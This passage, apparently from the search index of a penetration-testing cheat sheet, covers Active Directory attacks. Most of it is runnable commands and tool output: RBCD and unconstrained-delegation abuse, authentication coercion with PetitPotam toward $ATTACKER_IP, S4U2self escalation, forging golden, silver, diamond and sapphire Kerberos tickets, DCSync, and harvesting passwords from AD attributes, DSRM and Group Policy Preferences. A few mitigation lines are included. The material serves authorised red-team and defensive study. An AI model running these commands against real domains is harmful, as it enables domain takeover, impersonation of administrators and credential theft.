[Reflection.Assembly]::LoadWithPartialName('System.IdentityModel') | out-null\nPS&gt; $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @('administrator')\nPS&gt; $idToImpersonate.Impersonate()\nPS&gt; [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name\nPS&gt; ls \\\\dc01.offense.local\\c$\n</code></pre>"},{"location":"active-directory/kerberos-delegation-rbcd/","title":"Kerberos Delegation - Resource Based Constrained Delegation","text":"<p>Resource-based Constrained Delegation was introduced in Windows Server 2012. </p> <p>The user sends a Service Ticket (ST) to access the service (\"Service A\"), and if the service is allowed to delegate to another pre-defined service (\"Service B\"), then Service A can present to the authentication service the TGS that the user provided and obtain a ST for the user to Service B.  https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html</p> <ol> <li> <p>Import Powermad and Powerview</p> <pre><code>PowerShell.exe -ExecutionPolicy Bypass\nImport-Module .\\powermad.ps1\nImport-Module .\\powerview.ps1\n</code></pre> </li> <li> <p>Get user SID</p> <pre><code>$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid\n$ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID}\n$ACE\nConvertFrom-SID $ACE.SecurityIdentifier\n\n# alternative (Windows/Linux)\nbloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get writable --otype COMPUTER --detail | egrep -i 'distinguishedName|msds-allowedtoactonbehalfofotheridentity'\n</code></pre> </li> <li> <p>Abuse MachineAccountQuota to create a computer account and set an SPN for it</p> <pre><code>New-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString 'Weakest123*' -AsPlainText -Force)\n\n# alternative (Windows/Linux)\nbloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add computer swktest 'Weakest123*'\n</code></pre> </li> <li> <p>Rewrite DC's AllowedToActOnBehalfOfOtherIdentity properties</p> <pre><code>$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\"\n$SDBytes = New-Object byte[] ($SD.BinaryLength)\n$SD.GetBinaryForm($SDBytes, 0)\nGet-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n$RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity\n$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0\n$Descriptor.DiscretionaryAcl\n\n# alternative (Windows/Linux)\n# use 'remove' instead of 'add' after exploit\nbloodyAD --host 10.1.0.4 -u user -p 'totoTOTOtoto1234*' -d crash.lab add rbcd 'dc01-ww2$' 'swktest$'\n</code></pre> <pre><code># alternative\n$SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \"O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)\"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}\n\n# alternative\nStandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND\n</code></pre> </li> <li> <p>Use Rubeus to get hash from password</p> <pre><code>Rubeus.exe hash /password:'Weakest123*' /user:swktest$  /domain:factory.lan\n[*] Input password             : Weakest123*\n[*] Input username             : swktest$\n[*] Input domain               : factory.lan\n[*] Salt                       : FACTORY.LANswktest\n[*]       rc4_hmac             : F8E064CA98539B735600714A1F1907DD\n[*]       aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498\n[*]       aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347\n[*]       des_cbc_md5          : BA297CFD07E62A5E\n</code></pre> </li> <li> <p>Impersonate domain admin using our newly created machine account</p> <pre><code>.\\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap\n.\\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap\n\n[*] Impersonating user 'Administrator' to target SPN 'cifs/dc01-ww2.factory.lan'\n[*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5)\n[*] Building S4U2proxy request for service: 'cifs/dc01-ww2.factory.lan'\n[*] Sending S4U2proxy request\n[+] S4U2proxy success!\n[*] base64(ticket.kirbi) for SPN 'cifs/dc01-ww2.factory.lan':\n\n    doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD\n    AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE\n    LmZhY3RvcnkubGFu\n\n[*] Action: Import Ticket\n[+] Ticket successfully imported!\n</code></pre> </li> </ol>"},{"location":"active-directory/kerberos-delegation-rbcd/#references","title":"References","text":"<ul> <li>Wagging the Dog: Abusing Resource-Based Constrained Delegation to Attack Active Directory - 28 January 2019 - Elad Shami</li> <li>A Case Study in Wagging the Dog: Computer Takeover - Will Schroeder - Feb 28, 2019</li> </ul>"},{"location":"active-directory/kerberos-delegation-unconstrained/","title":"Kerberos Delegation - Unconstrained Delegation","text":"<p>The user sends a ST to access the service, along with their TGT, and then the service can use the user's TGT to request a ST for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html </p> <p>When a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user's TGT ticket gets saved to that computer's memory. </p> <p> Unconstrained delegation used to be the only option available in Windows 2000</p> <p>Warning Remember to coerce to a HOSTNAME if you want a Kerberos Ticket</p>"},{"location":"active-directory/kerberos-delegation-unconstrained/#spoolservice-abuse-with-unconstrained-delegation","title":"SpoolService Abuse with Unconstrained Delegation","text":"<p>The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.</p> <p>Requirements: - Object with Property Trust this computer for delegation to any service (Kerberos only) - Must have ADS_UF_TRUSTED_FOR_DELEGATION  - Must not have ADS_UF_NOT_DELEGATED flag - User must not be in the Protected Users group  - User must not have the flag Account is sensitive and cannot be delegated</p>"},{"location":"active-directory/kerberos-delegation-unconstrained/#find-delegation","title":"Find delegation","text":"<p> : Domain controllers usually have unconstrained delegation enabled.   Check the <code>TRUSTED_FOR_DELEGATION</code> property.</p> <ul> <li>ADModule <pre><code># From https://github.com/samratashok/ADModule\nPS&gt; Get-ADComputer -Filter {TrustedForDelegation -eq $True}\n</code></pre></li> <li> <p>bloodyAD <pre><code>bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&amp;(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))' --attr sAMAccountName,userAccountControl\n</code></pre></p> </li> <li> <p>ldapdomaindump <pre><code>$&gt; ldapdomaindump -u \"DOMAIN\\\\Account\" -p \"Password123*\" 10.10.10.10   \ngrep TRUSTED_FOR_DELEGATION domain_computers.grep\n</code></pre></p> </li> <li> <p>CrackMapExec module <pre><code>cme ldap 10.10.10.10 -u username -p password --trusted-for-delegation\n</code></pre></p> </li> <li> <p>BloodHound: <code>MATCH (c:Computer {unconstraineddelegation:true}) RETURN c</code></p> </li> <li>Powershell Active Directory module: <code>Get-ADComputer -LDAPFilter \"(&amp;(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))\" -Properties DNSHostName,userAccountControl</code></li> </ul>"},{"location":"active-directory/kerberos-delegation-unconstrained/#spoolservice-status","title":"SpoolService status","text":"<p>Check if the spool service is running on the remote host</p> <pre><code>ls \\\\dc01\\pipe\\spoolss\npython rpcdump.py DOMAIN/user:password@10.10.10.10\n</code></pre>"},{"location":"active-directory/kerberos-delegation-unconstrained/#monitor-with-rubeus","title":"Monitor with Rubeus","text":"<p>Monitor incoming connections from Rubeus.</p> <pre><code>Rubeus.exe monitor /interval:1 \n</code></pre>"},{"location":"active-directory/kerberos-delegation-unconstrained/#force-a-connect-back-from-the-dc","title":"Force a connect back from the DC","text":"<p>Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.</p> <p>SpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a \"feature\" in the MS-RPRN RPC interface.</p> <pre><code># From https://github.com/leechristensen/SpoolSample\n.\\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME\n.\\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB\n# DC01.HACKER.LAB is the domain controller we want to compromise\n# HELPDESK.HACKER.LAB is the machine with delegation enabled that we control.\n\n# From https://github.com/dirkjanm/krbrelayx\nprinterbug.py 'domain/username:password'@&lt;VICTIM-DC-NAME&gt; &lt;UNCONSTRAINED-SERVER-DC-NAME&gt;\n\n# From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689\npython dementor.py -d domain -u username -p password &lt;UNCONSTRAINED-SERVER-DC-NAME&gt; &lt;VICTIM-DC-NAME&gt;\n</code></pre> <p>If the attack worked you should get a TGT of the domain controller.</p>"},{"location":"active-directory/kerberos-delegation-unconstrained/#load-the-ticket","title":"Load the ticket","text":"<p>Extract the base64 TGT from Rubeus output and load it to our current session.</p> <pre><code>.\\Rubeus.exe asktgs /ticket:&lt;ticket base64&gt; /service:LDAP/dc.lab.local,cifs/dc.lab.local /ptt\n</code></pre> <p>Alternatively you could also grab the ticket using Mimikatz :  <code>mimikatz # sekurlsa::tickets</code></p> <p>Then you can use DCsync or another attack : <code>mimikatz # lsadump::dcsync /user:HACKER\\krbtgt</code></p>"},{"location":"active-directory/kerberos-delegation-unconstrained/#mitigation","title":"Mitigation","text":"<ul> <li>Ensure sensitive accounts cannot be delegated</li> <li>Disable the Print Spooler Service</li> </ul>"},{"location":"active-directory/kerberos-delegation-unconstrained/#ms-efsrpc-abuse-with-unconstrained-delegation","title":"MS-EFSRPC Abuse with Unconstrained Delegation","text":"<p>Using <code>PetitPotam</code>, another tool to coerce a callback from the targeted machine, instead of <code>SpoolSample</code>.</p> <pre><code># Coerce the callback\ngit clone https://github.com/topotam/PetitPotam\npython3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP\npython3 petitpotam.py -d '' -u '' -p '' $ATTACKER_IP $TARGET_IP\n\n# Extract the ticket\n.\\Rubeus.exe asktgs /ticket:&lt;ticket base64&gt; /ptt\n</code></pre>"},{"location":"active-directory/kerberos-delegation-unconstrained/#references","title":"References","text":"<ul> <li>Exploiting Unconstrained Delegation - Riccardo Ancarani - 28 APRIL 2019</li> <li>Hunting in Active Directory: Unconstrained Delegation &amp; Forests Trusts - Roberto Rodriguez - Nov 28, 2018</li> </ul>"},{"location":"active-directory/kerberos-s4u/","title":"Kerberos - Service for User Extension","text":"<ul> <li>Service For User To Self which allows a service to obtain a TGS on behalf of another user</li> <li>Service For User To Proxy which allows a service to obtain a TGS on behalf of another user on another service</li> </ul>"},{"location":"active-directory/kerberos-s4u/#s4u2self-privilege-escalation","title":"S4U2self - Privilege Escalation","text":"<ol> <li>Get a TGT <ul> <li>Using Unconstrained Delegation</li> <li>Using the current machine account: <code>Rubeus.exe tgtdeleg /nowrap</code></li> </ul> </li> <li>Use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.     <pre><code>Rubeus.exe s4u /self /nowrap /impersonateuser:\"Administrator\" /altservice:\"cifs/srv001.domain.local\" /ticket:\"base64ticket\"\nRubeus.exe ptt /ticket:\"base64ticket\"\n\nRubeus.exe s4u /self /nowrap /impersonateuser:\"Administrator\" /altservice:\"cifs/srv001\" /ticket:\"base64ticket\" /ptt\n</code></pre></li> </ol> <p>The \"Network Service\" account and the AppPool identities can act as the computer account in terms of Active Directory, they are only restrained locally. Therefore it is possible to invoke S4U2self if you run as one of these and request a service ticket for any user (e.g. someone with local admin rights, like DA) to yourself.</p> <pre><code># The Rubeus execution will fail when trying the S4UProxy step, but the ticket generated by S4USelf will be printed.\nRubeus.exe s4u /user:${computerAccount} /msdsspn:cifs/${computerDNS} /impersonateuser:${localAdmin} /ticket:${TGT} /nowrap\n# The service name is not included in the TGS ciphered data and can be modified at will.\nRubeus.exe tgssub /ticket:${ticket} /altservice:cifs/${ServerDNSName} /ptt\n</code></pre>"},{"location":"active-directory/kerberos-s4u/#references","title":"References","text":"<ul> <li>Abusing S4U2Self: Another Sneaky Active Directory Persistence - Alsid</li> <li>S4U2self abuse - TheHackerRecipes</li> <li>Abusing Kerberos S4U2self for local privilege escalation - cfalta</li> </ul>"},{"location":"active-directory/kerberos-tickets/","title":"Kerberos - Tickets","text":"<p>Tickets are used to grant access to network resources. A ticket is a data structure that contains information about the user's identity, the network service or resource being accessed, and the permissions or privileges associated with that resource. Kerberos tickets have a limited lifetime and expire after a set period of time, typically 8 to 12 hours.</p> <p>There are two types of tickets in Kerberos:</p> <ul> <li> <p>Ticket Granting Ticket (TGT): The TGT is obtained by the user during the initial authentication process. It is used to request additional service tickets without requiring the user to re-enter their credentials. The TGT contains the user's identity, a timestamp, and an encryption of the user's secret key.</p> </li> <li> <p>Service Ticket (ST): The service ticket is used to access a specific network service or resource. The user presents the service ticket to the service or resource, which then uses the ticket to authenticate the user and grant access to the requested resource. The service ticket contains the user's identity, a timestamp, and an encryption of the service's secret key.</p> </li> </ul>"},{"location":"active-directory/kerberos-tickets/#dump-kerberos-tickets","title":"Dump Kerberos Tickets","text":"<ul> <li>Mimikatz: <code>sekurlsa::tickets /export</code></li> <li>Rubeus    <pre><code># List available tickets\nRubeus.exe triage\n\n# Dump one ticket, the output is in Kirbi format\nRubeus.exe dump /luid:0x12d1f7\n</code></pre></li> </ul>"},{"location":"active-directory/kerberos-tickets/#replay-kerberos-tickets","title":"Replay Kerberos Tickets","text":"<ul> <li>Mimikatz: <code>mimikatz.exe \"kerberos::ptc C:\\temp\\TGT_Administrator@lab.local.ccache\"</code></li> <li>CrackMapExec: <code>KRB5CCNAME=/tmp/administrator.ccache crackmapexec smb 10.10.10 -u user --use-kcache</code></li> </ul>"},{"location":"active-directory/kerberos-tickets/#convert-kerberos-tickets","title":"Convert Kerberos Tickets","text":"<p>In the Kerberos authentication protocol, ccache and kirbi are two types of Kerberos credential caches that are used to store Kerberos tickets.</p> <ul> <li> <p>A credential cache, or <code>\"ccache\"</code> is a temporary storage area for Kerberos tickets that are obtained during the authentication process. The ccache contains the user's authentication credentials and is used to access network resources without having to re-enter the user's credentials for each request.</p> </li> <li> <p>The Kerberos Integrated Windows Authentication (KIWA) protocol used by Microsoft Windows systems also makes use of a credential cache called a <code>\"kirbi\"</code> cache. The kirbi cache is similar to the ccache used by standard Kerberos implementations, but with some differences in the way it is structured and managed.</p> </li> </ul> <p>While both caches serve the same basic purpose of storing Kerberos tickets to enable efficient access to network resources, they differ in format and structure. You can convert them easily using:</p> <ul> <li>kekeo: <code>misc::convert ccache ticket.kirbi</code></li> <li>impacket: <code>impacket-ticketConverter SRV01.kirbi SRV01.ccache</code></li> </ul>"},{"location":"active-directory/kerberos-tickets/#pass-the-ticket-golden-tickets","title":"Pass-the-Ticket Golden Tickets","text":"<p>Forging a TGT require: * the <code>krbtgt</code> NT hash * since recently, we cannot use a non-existent account name as a result of <code>CVE-2021-42287</code> mitigations</p> <p>The way to forge a Golden Ticket is very similar to the Silver Ticket one. The main differences are that, in this case, no service SPN must be specified to ticketer.py, and the krbtgt NT hash must be used.</p>"},{"location":"active-directory/kerberos-tickets/#using-mimikatz","title":"Using Mimikatz","text":"<pre><code># Get info - Mimikatz\nlsadump::lsa /inject /name:krbtgt\nlsadump::lsa /patch\nlsadump::trust /patch\nlsadump::dcsync /user:krbtgt\n\n# Forge a Golden ticket - Mimikatz\nkerberos::purge\nkerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt\nkerberos::tgt\n</code></pre>"},{"location":"active-directory/kerberos-tickets/#using-meterpreter","title":"Using Meterpreter","text":"<pre><code># Get info - Meterpreter(kiwi)\ndcsync_ntlm krbtgt\ndcsync krbtgt\n\n# Forge a Golden ticket - Meterpreter\nload kiwi\ngolden_ticket_create -d &lt;domainname&gt; -k &lt;nthashof krbtgt&gt; -s &lt;SID without le RID&gt; -u &lt;user_for_the_ticket&gt; -t &lt;location_to_store_tck&gt;\ngolden_ticket_create -d pentestlab.local -u pentestlabuser -s S-1-5-21-3737340914-2019594255-2413685307 -k d125e4f69c851529045ec95ca80fa37e -t /root/Downloads/pentestlabuser.tck\nkerberos_ticket_purge\nkerberos_ticket_use /root/Downloads/pentestlabuser.tck\nkerberos_ticket_list\n</code></pre>"},{"location":"active-directory/kerberos-tickets/#using-a-ticket-on-linux","title":"Using a ticket on Linux","text":"<pre><code># Convert the ticket kirbi to ccache with kekeo\nmisc::convert ccache ticket.kirbi\n\n# Alternatively you can use ticketer from Impacket\n./ticketer.py -nthash a577fcf16cfef780a2ceb343ec39a0d9 -domain-sid S-1-5-21-2972629792-1506071460-1188933728 -domain amity.local mbrody-da\n\nticketer.py -nthash HASHKRBTGT -domain-sid SID_DOMAIN_A -domain DEV Administrator -extra-sid SID_DOMAIN_B_ENTERPRISE_519\n./ticketer.py -nthash e65b41757ea496c2c60e82c05ba8b373 -domain-sid S-1-5-21-354401377-2576014548-1758765946 -domain DEV Administrator -extra-sid S-1-5-21-2992845451-2057077057-2526624608-519\n\nexport KRB5CCNAME=/home/user/ticket.ccache\ncat $KRB5CCNAME\n\n# NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file\n./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 \n</code></pre> <p>If you need to swap ticket between Windows and Linux, you need to convert them with <code>ticket_converter</code> or <code>kekeo</code>.</p> <pre><code>root@kali:ticket_converter$ python ticket_converter.py velociraptor.ccache velociraptor.kirbi\nConverting ccache =&gt; kirbi\nroot@kali:ticket_converter$ python ticket_converter.py velociraptor.kirbi velociraptor.ccache\nConverting kirbi =&gt; ccache\n</code></pre> <p>Mitigations:</p> <ul> <li>Hard to detect because they are legit TGT tickets</li> <li>Mimikatz generate a golden ticket with a life-span of 10 years</li> </ul>"},{"location":"active-directory/kerberos-tickets/#pass-the-ticket-silver-tickets","title":"Pass-the-Ticket Silver Tickets","text":"<p>Forging a Service Ticket (ST) require machine account password (key) or NT hash of the service account.</p> <pre><code># Create a ticket for the service\nmimikatz $ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARGET-HOST.DOMAIN.FQDN /rc4:TARGET-MACHINE-NT-HASH /service:SERVICE\n\n# Examples\nmimikatz $ /kerberos::golden /domain:adsec.local /user:ANY /sid:S-1-5-21-1423455951-1752654185-1824483205 /rc4:ceaxxxxxxxxxxxxxxxxxxxxxxxxxxxxx /target:DESKTOP-01.adsec.local /service:cifs /ptt\nmimikatz $ kerberos::golden /domain:jurassic.park /sid:S-1-5-21-1339291983-1349129144-367733775 /rc4:b18b4b218eccad1c223306ea1916885f /user:stegosaurus /service:cifs /target:labwws02.jurassic.park\n\n# Then use the same steps as a Golden ticket\nmimikatz $ misc::convert ccache ticket.kirbi\n\nroot@kali:/tmp$ export KRB5CCNAME=/home/user/ticket.ccache\nroot@kali:/tmp$ ./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 \n</code></pre> <p>Interesting services to target with a silver ticket :</p> Service Type Service Silver Tickets Attack WMI HOST + RPCSS <code>wmic.exe /authority:\"kerberos:DOMAIN\\DC01\" /node:\"DC01\" process call create \"cmd /c evil.exe\"</code> PowerShell Remoting CIFS + HTTP + (wsman?) <code>New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code> WinRM HTTP + wsman <code>New-PSSESSION -NAME PSC -ComputerName DC01; Enter-PSSession -Name PSC</code> Scheduled Tasks HOST <code>schtasks /create /s dc01 /SC WEEKLY /RU \"NT Authority\\System\" /IN \"SCOM Agent Health Check\" /IR \"C:/shell.ps1\"</code> Windows File Share (CIFS) CIFS <code>dir \\\\dc01\\c$</code> LDAP operations including Mimikatz DCSync LDAP <code>lsadump::dcsync /dc:dc01 /domain:domain.local /user:krbtgt</code> Windows Remote Server Administration Tools RPCSS   + LDAP  + CIFS / <p>Mitigations:</p> <ul> <li>Set the attribute \"Account is Sensitive and Cannot be Delegated\" to prevent lateral movement with the generated ticket.</li> </ul>"},{"location":"active-directory/kerberos-tickets/#pass-the-ticket-diamond-tickets","title":"Pass-the-Ticket Diamond Tickets","text":"<p>Request a legit low-priv TGT and recalculate only the PAC field providing the krbtgt encryption key</p> <p>Requirements:</p> <ul> <li>krbtgt NT Hash</li> <li>krbtgt AES key</li> </ul> <pre><code>ticketer.py -request -domain 'lab.local' -user 'domain_user' -password 'password' -nthash 'krbtgt/service NT hash' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' -user-id '1337' -groups '512,513,518,519,520' 'baduser'\n\nRubeus.exe diamond /domain:DOMAIN /user:USER /password:PASSWORD /dc:DOMAIN_CONTROLLER /enctype:AES256 /krbkey:HASH /ticketuser:USERNAME /ticketuserid:USER_ID /groups:GROUP_IDS\n</code></pre>"},{"location":"active-directory/kerberos-tickets/#pass-the-ticket-sapphire-tickets","title":"Pass-the-Ticket Sapphire Tickets","text":"<p>Requesting the target user's PAC with <code>S4U2self+U2U</code> exchange during TGS-REQ(P) (PKINIT).</p> <p>The goal is to mimic the PAC field as close as possible to a legitimate one.</p> <p>Requirements:</p> <ul> <li>Impacket PR#1411</li> <li>krbtgt AES key</li> </ul> <pre><code># baduser argument will be ignored\nticketer.py -request -impersonate 'domain_adm' -domain 'lab.local' -user 'domain_user' -password 'password' -aesKey 'krbtgt/service AES key' -domain-sid 'S-1-5-21-...' 'baduser'\n</code></pre>"},{"location":"active-directory/kerberos-tickets/#references","title":"References","text":"<ul> <li>Golden ticket - Pentestlab</li> <li>How Attackers Use Kerberos Silver Tickets to Exploit Systems - Sean Metcalf</li> <li>How To Pass the Ticket Through SSH Tunnels - bluescreenofjeff</li> <li>Diamond tickets - The Hacker Recipes</li> <li>A Diamond (Ticket) in the Ruff - By CHARLIE CLARK July 05, 2022</li> <li>Sapphire tickets - The Hacker Recipes</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 1</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 2</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 3</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 4</li> <li>WONKACHALL AKERVA NDH2018 \u2013 WRITE UP PART 5</li> <li>How To Attack Kerberos 101 - m0chan - July 31, 2019</li> <li>Kerberos (II): How to attack Kerberos? - June 4, 2019 - ELOY P\u00c9REZ</li> </ul>"},{"location":"active-directory/pwd-comments/","title":"Password - AD User Comment","text":"<p>There are 3-4 fields that seem to be common in most Active Directory schemas: <code>UserPassword</code>, <code>UnixUserPassword</code>, <code>unicodePwd</code> and <code>msSFU30Password</code>.</p> <ul> <li> <p>Windows/Linux command     <pre><code>bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(|(userPassword=*)(unixUserPassword=*)(unicodePassword=*)(description=*))' --attr userPassword,unixUserPassword,unicodePwd,description\n</code></pre></p> </li> <li> <p>Password in User Description     <pre><code>crackmapexec ldap domain.lab -u 'username' -p 'password' -M user-desc\ncrackmapexec ldap 10.0.2.11 -u 'username' -p 'password' --kdcHost 10.0.2.11 -M get-desc-users\nGET-DESC... 10.0.2.11       389    dc01    [+] Found following users: \nGET-DESC... 10.0.2.11       389    dc01    User: Guest description: Built-in account for guest access to the computer/domain\nGET-DESC... 10.0.2.11       389    dc01    User: krbtgt description: Key Distribution Center Service Account\n</code></pre></p> </li> <li> <p>Get <code>unixUserPassword</code> attribute from all users in ldap     <pre><code>nxc ldap 10.10.10.10 -u user -p pass -M get-unixUserPassword -M getUserPassword\n</code></pre></p> </li> <li> <p>Native Powershell command     <pre><code>Get-WmiObject -Class Win32_UserAccount -Filter \"Domain='COMPANYDOMAIN' AND Disabled='False'\" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID\n</code></pre></p> </li> <li> <p>Dump the Active Directory and <code>grep</code> the content.     <pre><code>ldapdomaindump -u 'DOMAIN\\john' -p MyP@ssW0rd 10.10.10.10 -o ~/Documents/AD_DUMP/\n</code></pre></p> </li> </ul>"},{"location":"active-directory/pwd-dsrm-credentials/","title":"Password - DSRM Credentials","text":"<p>Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database.</p> <p>This is the local administrator account inside each DC. Having admin privileges in this machine, you can use Mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user.</p> <pre><code>Invoke-Mimikatz -Command '\"token::elevate\" \"lsadump::sam\"'\n\n# Check if the key exists and get the value\nGet-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior \n\n# Create key with value \"2\" if it doesn't exist\nNew-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD \n\n# Change value to \"2\"\nSet-ItemProperty \"HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\" -name DsrmAdminLogonBehavior -value 2\n</code></pre>"},{"location":"active-directory/pwd-group-policy-preferences/","title":"Password - Group Policy Preferences","text":"<p>Find passwords in SYSVOL (MS14-025). SYSVOL is the domain-wide share in Active Directory to which all authenticated users have read access. All domain Group Policies are stored here: <code>\\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\Policies\\</code>.</p> <pre><code>findstr /S /I cpassword \\\\&lt;FQDN&gt;\\sysvol\\&lt;FQDN&gt;\\policies\\*.xml\n</code></pre> <p>Decrypt a Group Policy Password found in SYSVOL (by 0x00C651E0), using the 32-byte AES key provided by Microsoft in the MSDN - 2.2.1.1.4 Password Encryption</p> <pre><code>echo 'password_in_base64' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000\n\ne.g: \necho '5OPdEKwZSf7dYAvLOe6RzRDtcvT/wCP8g5RqmAgjSso=' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000\n\necho 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ' | base64 -d | openssl enc -d -aes-256-cbc -K 4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b -iv 0000000000000000\n</code></pre>"},{"location":"active-directory/pwd-group-policy-preferences/#automate-the-sysvol-and-passwords-research","title":"Automate the SYSVOL and passwords research","text":"<ul> <li> <p><code>Metasploit</code> modules to enumerate shares and credentials     <pre><code>scanner/smb/smb_enumshares\npost/windows/gather/enum_shares\npost/windows/gather/credentials/gpp\n</code></pre></p> </li> <li> <p>CrackMapExec modules     <pre><code>cme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_autologin\ncme smb 10.10.10.10 -u Administrator -H 89[...]9d -M gpp_password\n</code></pre></p> </li> <li> <p>Get-GPPPassword <pre><code># with a NULL session\nGet-GPPPassword.py -no-pass 'DOMAIN_CONTROLLER'\n\n# with cleartext credentials\nGet-GPPPassword.py 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n\n# pass-the-hash\nGet-GPPPassword.py -hashes 'LMhash':'NThash' 'DOMAIN'/'USER':'PASSWORD'@'DOMAIN_CONTROLLER'\n</code></pre></p> </li> </ul>"},{"location":"active-directory/pwd-group-policy-preferences/#mitigations","title":"Mitigations","text":"<ul> <li>Install KB2962486 on every computer used to manage GPOs which prevents new credentials from being placed in Group Policy Preferences.</li> <li>Delete existing GPP xml files in SYSVOL containing passwords.</li> <li>Don\u2019t put passwords in files that are accessible by all authenticated users.</li> </ul>"},{"location":"active-directory/pwd-group-policy-preferences/#references","title":"References","text":"<ul> <li>Finding Passwords in SYSVOL &amp; Exploiting Group Policy Preferences</li> </ul>"},{"location":"active-directory/pwd-precreated-computer/","title":"Password - Pre-Created Computer Account","text":"<p>When <code>Assign this computer account as a pre-Windows 2000 computer</code> checkmark is checked, the password for the computer account becomes the same as the computer account in lowercase. For instance, the computer account SERVERDEMO$ would have the password serverdemo. 